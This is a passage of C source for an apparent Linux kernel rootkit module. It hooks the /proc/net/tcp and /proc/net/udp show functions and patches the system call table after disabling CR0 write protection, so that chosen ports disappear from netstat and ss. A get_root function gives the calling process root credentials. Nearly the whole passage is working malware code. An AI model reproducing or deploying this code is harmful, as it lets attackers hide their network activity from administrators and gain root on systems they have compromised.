		// Check if the socket is being hidden and unhide it.
		for (i = 0; i < MAX_SOCK_HIDE; i++)
		{
			if (hidden_sockets[i].port == unhide_me
				&& hidden_sockets[i].protocol == 2) // UDP
			{
				hidden_sockets[i].port = -1;
				hidden_sockets[i].protocol = 0;	
				break; // IMPORTANT!!	
			}
		}
	}
	else
		return 0;

	num_hidden_sockets--;
	return 1;
}

void hook_tcp_udp_seq_ops(void)
{
	struct proc_dir_entry *tcp_dir_entry = init_net.proc_net->subdir;
	struct proc_dir_entry *udp_dir_entry = init_net.proc_net->subdir;

	// Get proc_dir_entry's for /proc/net/tcp and /proc/net/udp.
	while (strcmp(tcp_dir_entry->name, "tcp"))
		tcp_dir_entry = tcp_dir_entry->next;
	
	while (strcmp(udp_dir_entry->name, "udp"))
		udp_dir_entry = udp_dir_entry->next;

	// Get tcp and udp afinfo.a
	tcp_afinfo = (struct tcp_seq_afinfo *)tcp_dir_entry->data;
	udp_afinfo = (struct udp_seq_afinfo *)udp_dir_entry->data;

	// Save the original seq_ops.show functions for tcp and udp.	
	p_original_tcp_seq_show = tcp_afinfo->seq_ops.show;
	p_original_udp_seq_show = udp_afinfo->seq_ops.show;

	// Replace the seq_ops.show with our own.
	tcp_afinfo->seq_ops.show = hooked_tcp_seq_show;
	udp_afinfo->seq_ops.show = hooked_udp_seq_show;
}

void unhook_tcp_udp_seq_ops(void)
{
	// Put original seq_ops.show functions into place.
	tcp_afinfo->seq_ops.show = p_original_tcp_seq_show;
	udp_afinfo->seq_ops.show = p_original_udp_seq_show;
}

/*
* This functions hides tcp connections from netstat.
* We go over the list of hidden sockets, check if the port numbers
* match those of hidden sockets and check if the protocol type is tcp.
*/
int hooked_tcp_seq_show(struct seq_file *m, void *v)
{
	int i;
	int ret_val = p_original_tcp_seq_show(m, v);
	char hide_port[16];
	
	for (i = 0; i < MAX_SOCK_HIDE; i++)
	{
		if (hidden_sockets[i].port > -1 
			&& 1 == hidden_sockets[i].protocol) // TCP
		{
			// Port number needs to be in hex format.
			sprintf(hide_port, "%04X", hidden_sockets[i].port);

			if (strnstr(m->buf + m->count - TCP_ENTRY_SZ, hide_port, TCP_ENTRY_SZ))
				m->count -= TCP_ENTRY_SZ;
		}
	}	

	return ret_val;	
}

/*
* This functions hides udp connections from netstat.
* We go over the list of hidden sockets, check if the port numbers
* match those of hidden sockets and check if the protocol type is udp.
*/
int hooked_udp_seq_show(struct seq_file *m, void *v)
{
	int i;
	int ret_val = p_original_udp_seq_show(m, v);
	char hide_port[16];

	for (i = 0; i < MAX_SOCK_HIDE; i++)
	{
		if (hidden_sockets[i].port > -1 
			&& 2 == hidden_sockets[i].protocol) // UDP
		{
			// Port number needs to be in hex format.
			sprintf(hide_port, "%04X", hidden_sockets[i].port);

			if (strnstr(m->buf + m->count - UDP_ENTRY_SZ, hide_port, UDP_ENTRY_SZ))
				m->count -= UDP_ENTRY_SZ;
		}
	}	

	return ret_val;	
}


void hook_socketcall(void)
{
	p_original_socketcall = (asmlinkage long (*)(int, unsigned long __user*))prak_sys_socketcall;
	write_cr0(read_cr0() & (~0x10000));
	((unsigned long *)p_sys_call_table)[__NR_socketcall] = (unsigned long)hooked_socketcall;
	write_cr0(read_cr0() | 0x10000);
}

void unhook_socketcall(void)
{
	write_cr0(read_cr0() & (~0x10000));
	((unsigned long *)p_sys_call_table)[__NR_socketcall] = (unsigned long)p_original_socketcall;
	write_cr0(read_cr0() | 0x10000);
}

/*
* We hook this function in order to hide tcp connections from ss.
* udp connections are handled the same way by ss as netstat, so there
* is nothing to do there and we can concentrate on tcp.
* TODO: More info on the function.
*/
asmlinkage long hooked_socketcall(int call, unsigned long __user *args)
{
	// the message of the system call.
	struct msghdr *msg = NULL;

	// The current datablock.
	struct nlmsghdr *datablock = NULL;
	
	// The payload of the datablock is of type inet_diag_msg.
	struct inet_diag_msg *payload = NULL;

	// Current port.
	int current_port = -1;

	// Variable to iterate and calculate offset.
	int i, offset, hide;

	// Pointer to the begin of the datablock.
	char *pointer_datablock_begin = NULL;

	// the original return value.
	long original_result = p_original_socketcall(call, args);

	// A return value used as lvalue in NLMSG_NEXT to determine the remaining bytes until the end of the method.
	long bytes_until_end = original_result;

	// Check if there is a SYS_RECVMSG system call.
	if (SYS_RECVMSG == call)
	{
		// There is a SYS_RECVMSG system call.
		msg = (struct msghdr *)(((int *)args)[1]);
	
		// Extract the first datablock of the message.
		datablock = (struct nlmsghdr *)(msg->msg_iov->iov_base);

		// Iterate through all datablocks.
		while (NLMSG_OK(datablock, bytes_until_end))
		{
			// Determine the payload.
			payload = NLMSG_DATA(datablock);

			// Determine the port of the socket.
			current_port = ntohs(payload->id.idiag_sport);

			// Check if this port should be hidden.
			hide = 0;
			for (i = 0; i < MAX_SOCK_HIDE; i++)
			{
				if (hidden_sockets[i].port == current_port
					&& hidden_sockets[i].protocol == 1)
					hide = 1;
			}

			if (1 == hide)
			{
				// Calculate the offset of the current datablock.
				offset = NLMSG_ALIGN(datablock->nlmsg_len);

				// Create a pointer to the begin of the current datablock.
				pointer_datablock_begin = (char*)datablock;

				// Remove the datablock of the message.
				for (i = 0; i < bytes_until_end; i++)
					pointer_datablock_begin[i] = pointer_datablock_begin[i + offset];

				// Adjust the return value.
				original_result -= offset; 

				// Done.
				//break;
			}
			else
			{
				// Determine the next datablock.
				datablock = NLMSG_NEXT(datablock, bytes_until_end);
			}
		}	
	}

	return original_result;	
}

/*
*************************************************
*	Functions used to escalate privileges		*
* 	to root.									*
*************************************************
*/

/*
* This function gives root privileges to the calling process,
* by modifying the credentials and setting the appropriate fields
* to 0, thus giving root privileges.
*/	
void get_root(void)
{
	// Get root
	struct cred *new_creds = prepare_creds();
	new_creds->uid = new_creds->gid = 0;
	new_creds->euid = new_creds->egid = 0;
	new_creds->suid = new_creds->sgid = 0;
	new_creds->fsuid = new_creds->fsgid = 0;
	commit_creds(new_creds);
}

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_LICENSE(DRIVER_LICENSE);
MODULE_DESCRIPTION(DRIVER_DESC);
